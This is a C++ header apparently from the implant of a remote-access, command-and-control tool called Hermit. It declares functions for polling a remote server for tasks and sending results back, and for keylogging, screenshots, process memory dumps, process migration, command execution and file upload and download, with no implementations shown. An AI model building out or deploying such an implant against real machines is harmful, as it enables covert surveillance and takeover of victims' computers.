#ifndef HERMIT_TASK_HPP
#define HERMIT_TASK_HPP

#include <windows.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <psapi.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <string>
#include <tlhelp32.h>
#include <vector>
#include "common.hpp"
#include "constants.hpp"
#include "convert.hpp"
#include "fs.hpp"
#include "keylog.hpp"
#include "screenshot.hpp"
#include "types.hpp"
#include "utils.hpp"
#include "winhttp.hpp"
#include "winsystem.hpp"

std::wstring GetTask(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath
);

std::wstring ExecuteTaskCat(const std::wstring& wFile);
std::wstring ExecuteTaskCd(const std::wstring& wDestDir);
std::wstring ExecuteTaskCp(const std::wstring& wSrc, const std::wstring& wDest);
std::wstring ExecuteTaskDownload(
    HINTERNET hConnect,
	const std::wstring& wSrc,
	const std::wstring& wDest
);
std::wstring ExecuteTaskExecute(const std::wstring& cmd);
std::wstring ExecuteTaskKeyLog(const std::wstring& wLogTime);
std::wstring ExecuteTaskKill();
std::wstring ExecuteTaskLs(const std::wstring& wDir);
std::wstring ExecuteTaskMigrate(const std::wstring& wPid);
std::wstring ExecuteTaskMkdir(const std::wstring& wDir);
std::wstring ExecuteTaskMv(
	const std::wstring& wSrc,
	const std::wstring& wDest
);
std::wstring ExecuteTaskProcdump(const std::wstring& wPid);
std::wstring ExecuteTaskPs();
std::wstring ExecuteTaskPsKill(const std::wstring& wPid);
std::wstring ExecuteTaskPwd();
std::wstring ExecuteTaskRm(const std::wstring& wFile);
std::wstring ExecuteTaskRmdir(const std::wstring& wDir);
std::wstring ExecuteTaskScreenshot(HINSTANCE hInstance, INT nCmdShow);
std::wstring ExecuteTaskSleep(const std::wstring& wSleepTime, INT &nSleep);
std::wstring ExecuteTaskUpload(
    HINTERNET hConnect,
    const std::wstring& wSrc,
    const std::wstring& wDest
);
std::wstring ExecuteTaskWhoami();
std::wstring ExecuteTask(
	HINSTANCE hInstance,
	INT nCmdShow,
    HINTERNET hConnect,
	const std::wstring& task,
	INT &nSleep
);

BOOL SendTaskResult(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	const std::wstring& task,
	const std::wstring& taskResult
);

#endif // HERMIT_TASK_HPP